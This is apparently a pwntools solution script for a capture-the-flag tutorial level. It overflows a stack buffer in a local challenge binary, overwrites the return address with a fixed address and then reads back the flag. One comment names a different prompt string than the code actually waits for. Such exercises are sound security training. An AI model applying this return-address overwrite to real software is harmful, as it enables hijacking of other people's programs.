from pwn import *

# Set architecture, os and log level
context(arch="amd64", os="linux", log_level="info")

# Load the ELF file and execute it as a new process.
challenge_path = "/challenge/pwntools-tutorials-level4.0"
p = process(challenge_path)

payload = b"A" * 48 + b"B" * 8 + p64(0x00401f0f)
# Send the payload after the string ":)\n###\n" is found.
p.sendlineafter("Give me your input\n", payload)

# Receive flag from the process
flag = p.recvall(timeout=1)
print(f"flag is: {flag}")
